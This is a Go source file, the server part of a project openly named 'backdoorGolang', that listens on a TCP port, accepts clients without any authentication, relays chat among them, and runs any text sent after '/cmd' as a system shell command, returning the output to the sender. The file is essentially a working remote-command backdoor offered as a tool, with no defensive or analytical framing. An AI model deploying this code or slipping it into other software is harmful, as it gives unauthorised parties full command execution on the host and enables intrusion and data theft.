package server

import (
	"bytes"
	"container/list"
	"fmt"
	"net"
	"regexp"
	"strings"

	"github.com/pilebones/backdoorGolang/core/cli"
	"github.com/pilebones/backdoorGolang/core/socket"
)

const (
	// Threshold : Limit of simultanous message between client from channel
	BUFFER_CLIENT_NB_MESSAGE_THRESHOLD = 200
	// Threshold : Limit the buffer size for sockets
	BUFFER_SIZE = 1024
)

/** ServerProvider structure */
type Server struct {
	socket.SocketContext
	Clients *list.List
}

/** Init server instance */
func Create(target *socket.Target, useDebugMode bool) Server {
	server := Server{socket.SocketContext{Target: target, UseDebugMode: useDebugMode}, list.New()}
	return server
}

func (s Server) Start() {

	// Pipe between all clients, this pipe relay all message receive from clients to all clients
	in := make(chan string, BUFFER_CLIENT_NB_MESSAGE_THRESHOLD) // Limit number of simultaneous message with a threshold to avoid server DOS
	go IOHandler(in, s.Clients)                                 // Init clients channel for message (async management)

	// Listen on all <host>:<port>
	serverAddr := fmt.Sprintf("%s:%d", s.Target.Host, s.Target.Port)
	listener, err := net.Listen("tcp", serverAddr)
	if err != nil {
		panic(err.Error())
	}

	// Registration socket closure process at the end of func (close socket properly)
	defer listener.Close()

	// Infinite loop (until CTRL+C)
	for {
		fmt.Println("[SERVER][" + serverAddr + "] Waiting for client...")

		// accept connection on port
		connection, err := listener.Accept()
		if err != nil {
			panic(err.Error())
		}

		fmt.Print("[SERVER]["+serverAddr+"] Connection receive from ", connection.RemoteAddr(), "\n")
		go ClientHandler(connection, in, s.Clients) // Manage all clients asychronously
	}
}

/**
 * Manage asynchronously IO from all connected clients
 *
 * @param Incoming - A pipe between each client to relay message
 * @param clients - A list of connected client
 */
func IOHandler(Incoming <-chan string, clients *list.List) {
	for {
		// fmt.Println("IOHandler : Waiting for input")
		// Waiting incoming message from a client
		input := <-Incoming
		// fmt.Println("IOHandler : Handling ", input)
		for element := clients.Front(); element != nil; element = element.Next() {
			client := element.Value.(Client)
			client.Incoming <- input // Notify all clients for this message
		}
	}
}

/**
 * Manage I/O client from server socket
 *
 * @param connection - Socket between client and server
 * @param messageChannel - The shared bus message between all clients
 * @param clients - The list of all clients connected
 */
func ClientHandler(connection net.Conn, messageChannel chan string, clients *list.List) {
	// Create new client instance
	newClient := &Client{make(chan string), messageChannel, connection, make(chan bool), clients}
	go ClientSender(newClient)   // Manage sending message
	go ClientReceiver(newClient) // Manage receiving message
	clients.PushBack(*newClient) // Register client to server list of connected clients

	// Send Message to the current user only
	newClient.SendMessage(fmt.Sprintf("Connection to Pilebones's Backdoor, Welcome %s\n", connection.RemoteAddr().String()))
	newClient.SendMessage(fmt.Sprintf("To logout : press \"/quit\"\n"))
	newClient.SendMessage(fmt.Sprintf("List of all user connected :\n"))
	for element := clients.Front(); element != nil; element = element.Next() {
		client := element.Value.(Client)
		isCurrentUser := client.Connection.RemoteAddr().String() == newClient.Connection.RemoteAddr().String()
		if !isCurrentUser {
			// Notify other clients for the new connection
			client.SendMessage(fmt.Sprintf("Another client as joined the server %s\n", connection.RemoteAddr().String()))
		}

		message := fmt.Sprintf("- " + client.Connection.RemoteAddr().String())
		if isCurrentUser {
			message += " (you)"
		}
		newClient.SendMessage(message + "\n")
	}

	// Notify all clients for the new connection
	// messageChannel <- fmt.Sprintf("Another client as joined the server %s\n", connection.RemoteAddr().String())
}

/**
 * Manage output from server-side socket
 *
 * @param client - Client object
 */
func ClientSender(client *Client) {
	clientId := client.Connection.RemoteAddr()
	for {
		select {
		// Standard message receive by the server from a client
		case buffer := <-client.Incoming:
			fmt.Println("[SERVER] Sending to ", clientId.String(), ":")
			client.SendMessage(buffer)
		// Logout instruction
		case <-client.Quit:
			fmt.Println("Client ", clientId.String(), " quitting")
			client.Connection.Close()
			break

		}
	}
}

/**
 * Manage client input from server-side socket
 *
 * @param client - Client object
 */
func ClientReceiver(client *Client) {

	buffer := make([]byte, BUFFER_SIZE)
	for client.Read(buffer) { // While read data from server-side socket

		cleanedBuffer := cleanBuffer(buffer) // Remove zero bytes from buffer[BUFFER_SIZE]
		messageTrimmed := strings.TrimSpace(string(cleanedBuffer))
		if 0 == len(messageTrimmed) {
			continue // Skip empty message
		}

		fmt.Printf("ClientReader receiver from %s : \"%s\"\n", client.GetId(), messageTrimmed)
		bufferTrimmed := bytes.NewBufferString(messageTrimmed).Bytes() // buffer message whithout "\n"
		if instructionParser(client, bufferTrimmed) {
			break
		}

		// Sending message to client
		client.Outgoing <- fmt.Sprintf("[%s] %s\n", client.GetId(), string(bufferTrimmed))

		// Erase all data from buffer
		for i := 0; i < BUFFER_SIZE; i++ {
			buffer[i] = 0x00 // Char End-Line
		}
	}

	client.Outgoing <- fmt.Sprintf("[%s] has left the server\n", client.GetId())
}

/**
 * Manage instruction from client
 *
 * @param client - Client object
 * @param buffer - Client input
 */
func instructionParser(client *Client, buffer []byte) bool {
	if matched, _ := regexp.Match("^/(quit|exit)$", buffer); matched { // Logout Instruction
		client.Close()
		return true
	} else if matched, _ := regexp.Match("^/cmd (.+)", buffer); matched { // Command Instruction
		r := regexp.MustCompile(`^/cmd (?P<command>.*)`)
		matches := r.FindStringSubmatch(string(buffer))
		if 1 < len(matches) {
			// Handle error if running failed
			defer func() {
				if err := recover(); err != nil {
					// Handle our error.
					fmt.Printf("[%s] Unable to execute command, error : %s\n", client.GetId(), err)
					client.SendMessage(fmt.Sprintf("Unable to execute the command, error : %s\n", err))
				}
			}()

			command := matches[1]
			fmt.Printf("[%s] Execute the following system command : %s\n", client.GetId(), command)
			output := cli.ExecShellScriptOrPanic(command)
			client.SendMessage(output)
		}

		// client.SendMessage();
	}

	return false
}

/**
 * Remove from buffer empty data (zero bytes)
 *
 * @param buffer []byte
 */
func cleanBuffer(buffer []byte) []byte {
	count := 0
	// Add End-line char to buffer before sending
	for i := 0; i < len(buffer); i++ {
		if buffer[i] == 0x00 {
			break
		}
		count++
	}

	return []byte(buffer)[0:count]
}
